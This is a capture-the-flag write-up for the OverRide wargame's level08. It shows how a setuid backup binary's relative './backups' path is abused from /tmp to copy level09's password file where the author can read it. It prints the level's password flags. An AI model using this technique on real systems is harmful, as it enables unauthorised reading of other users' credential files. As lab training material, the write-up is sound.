For this exercise we have a binary which reads on stdin and ask for a file ask
input.

level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)

We can give level08 as input and it works

level08@OverRide:~$ ./level08 level08
level08@OverRide:~$ ./level08 .pass

In the home there is also a backups directory :

level08@OverRide:~$ ls
backups  level08
level08@OverRide:~$ cd backups/
level08@OverRide:~/backups$ ls -la
total 12
drwxrwx---+ 1 level09 users    100 Apr 20 14:13 .
dr-xr-x---+ 1 level08 level08  100 Oct 19  2016 ..
-r--r-----+ 1 level09 users   1760 Apr 20 14:03 level08
-rwxrwx---+ 1 level09 users     57 Apr 20 14:13 .log
-r--r-----+ 1 level09 users     41 Apr 20 14:13 .pass
level08@OverRide:~/backups$
level08@OverRide:~/backups$ cat .pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

In which there is a file same as our input.

Can we try to send level09's .pass ?

level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:~$ cat backups/.log
LOG: Starting back up: /home/users/level09/.pass

The logfile says that the level09's pass is being backed up but there is no trace
of it in the backups directory.

The error message gives us a lot of information :

ERROR: Failed to open ./backups//home/users/level09/.pass

level08 binary looks at the backups directory in the parent directory "./backups"
It then search for the file.

What if we tried to create our backups directory ? In /tmp for example ?

level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ cd backups/
level08@OverRide:/tmp/backups$ ls
level08@OverRide:/tmp/backups$ ls -la
total 4
drwxrwxr-x 2 level08 level08 60 Apr 20 15:01 .
drwxrwxrwt 3 root    root    60 Apr 20 15:01 ..
-rw-rw-r-- 1 level09 users   49 Apr 20 15:01 .log
level08@OverRide:/tmp/backups$ cat .log
LOG: Starting back up: /home/users/level09/.pass

It is still looking for /backups/home/users/level09/.pass

Can we create this path to make it work ?

level08@OverRide:/tmp/backups$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups/.log
level08@OverRide:/tmp/backups$ cat .log
LOG: Starting back up: /home/users/level09/.pass
level08@OverRide:/tmp/backups$ ls
home
level08@OverRide:/tmp/backups$ ls -la
total 4
drwxrwxr-x 3 level08 level08 80 Apr 20 15:03 .
drwxrwxrwt 3 root    root    60 Apr 20 15:01 ..
drwxrwxr-x 3 level08 level08 60 Apr 20 15:03 home
-rw-rw-r-- 1 level09 users   49 Apr 20 15:01 .log
level08@OverRide:/tmp/backups$ cat home/users/level09/.
./  ../

It doesn't work here because we are not in the good directory (backups instead
of /tmp, so level08 can't find the backups directory)

level08@OverRide:/tmp/backups$ cd ..
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass

No error message it's looking good !

level08@OverRide:/tmp$ cat backups/.log
LOG: Starting back up: /home/users/level09/.pass
LOG: Finished back up /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

